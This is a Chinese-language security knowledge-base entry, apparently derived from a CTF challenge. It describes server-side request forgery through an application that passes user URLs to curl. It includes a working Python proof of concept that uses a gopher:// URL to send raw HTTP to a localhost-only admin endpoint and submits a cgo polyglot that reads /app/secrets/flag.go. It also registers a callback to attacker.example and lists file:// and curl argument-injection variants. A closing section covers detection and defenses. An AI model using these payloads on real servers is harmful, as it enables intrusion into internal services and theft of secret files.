---
id: web-generic-ssrf-curl-gopher-loopback-admin
title: 服务端 curl 执行用户 URL：gopher 构造原始 HTTP 请求绕过仅 localhost 管理校验
type: scenario
domain: web
path: web/generic/ssrf
technique: curl-gopher-ssrf
tags:
- web
- ssrf
- gopher
- curl
- loopback
- admin-bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V19
  verified_at: '2026-11-05T02:10:00+08:00'
  notes: 已对照原文核对；handleRegistration以curl执行用户agentUrl、isLocalhost仅校验RemoteAddr，gopher构造原始POST绕过均准确；CTF无版本区间；未复跑PoC
url: /docs/web/generic/ssrf/web-generic-ssrf-curl-gopher-loopback-admin/
draft: false
kb_aliases:
- curl SSRF
- gopher SSRF
- gopher 协议打内网
- localhost 管理接口绕过
---

## 一句话结论

当应用用 `exec.Command("curl", 用户输入)` 发起请求时，把 URL 换成 `gopher://127.0.0.1:PORT/_<编码后的原始 HTTP 请求>`，即可从服务端本机向仅允许 localhost 的管理接口发送任意请求。

## 原理

curl 支持 gopher 协议，`gopher://host:port/_<data>` 会把 `<data>` URL 解码后原样写入 TCP 连接。攻击者因此在 data 中放入完整的 HTTP 请求行、头和 body，curl 就相当于一个任意 TCP 报文发送器。

应用的“仅 localhost”校验通常读取 `req.RemoteAddr`（如 `127.0.0.1`）。当请求由本机 curl 发起时，源地址天然是回环地址，校验通过；而攻击者从外部只能访问公开接口，于是通过“公开接口触发 curl”完成跳跃。与普通 SSRF 不同，gopher 允许发送 POST/PUT 等任意方法、自定义头和请求体，能打只收 POST 且校验内部字段的管理端点。

## 触发条件

- 服务端把用户可控字符串拼进 curl 命令行（`curl <url>`、`curl -T file <url>` 等）；
- 未限制协议，或允许 `gopher://`；
- 目标管理接口只依据来源 IP 为 127.0.0.1/::1 做鉴权；
- 攻击者知道内部端口与路径（可爆破或从代码/报错推断）。

## 利用步骤

1. 找到回显/副作用可判断的 curl 调用点（注册、回调、URL 预览等）；
2. 先访问公开接口拿到后续需要的 ID/令牌（示例中为注册 agent 返回的 UUID）；
3. 构造原始 HTTP 请求文本，包含方法、路径、Host、Content-Length 与 body；
4. 对整个请求做 URL 编码，拼到 `gopher://127.0.0.1:PORT/_` 后提交；
5. 观察 curl 是否成功、内部接口是否产生预期副作用。

## PoC

```python
import requests, urllib.parse, textwrap

BASE = "http://target:8000"
CALLBACK = "https://attacker.example/hook"
LOOPBACK = "gopher://127.0.0.1:8000/_"

def register(url):
    return requests.post(f"{BASE}/register", json={"agentUrl": url}).text.strip()

def gopher_payload(uuid):
    src = textwrap.dedent("""\
        package main
        /*
        #define package
        #define secrets
        #define var char*
        #include "/app/secrets/flag.go"
        #include <stdio.h>
        void printflag(){puts(Flag);}
        */
        import "C"
        func main(){C.printflag()}
    """)
    raw = (
        f"POST /agent/{uuid}/execute HTTP/1.1\r\n"
        f"Content-Length: {len(src)}\r\n"
        "Host: localhost:8000\r\n\r\n"
        f"{src}\r\n"
    )
    return LOOPBACK + urllib.parse.quote(raw)

uuid = register(CALLBACK)   # 公开接口，同时让服务端 curl 回调
print(uuid)
register(gopher_payload(uuid))  # 触发 curl gopher 访问 localhost 管理接口
```

`urllib.parse.quote` 会把 `\r\n` 编码为 `%0D%0A`，curl 在 gopher 处理时解码并发送。

## 变体与关联

- 若 curl 禁用 gopher，可尝试 `dict://`、`file://`（读本地文件）、`http://127.0.0.1`（仅 GET）；
- 用 `-T` 上传文件时，gopher 仍是原样报文通道，可把本地文件内容作为请求体带走；
- 关联：SSRF 打内网管理接口、云元数据、curl 命令行注入（URL 以 `-` 开头时注入参数，如 `-o`、`--config`）；
- 与 Go cgo polyglot 组合：先 SSRF 到本机编译/执行接口，再投放编译期文件读取载荷。

## 检测与防御

- 检测：服务进程出现对 `127.0.0.1`/`::1` 的 gopher 连接；curl 参数含 `gopher://`、`dict://`、`file://`；同一来源先调公开接口再触发内部请求；
- 防御：不要把用户输入交给 shell/curl；必须用时以数组传参并强制 `--proto =https --proto-redir =https`，禁止 gopher/file/dict；解析 URL 校验 scheme 与 host 白名单；
- 架构：仅 localhost 的校验不足以作为鉴权，管理接口应加独立 token/mTLS；内网服务不应信任回环来源。
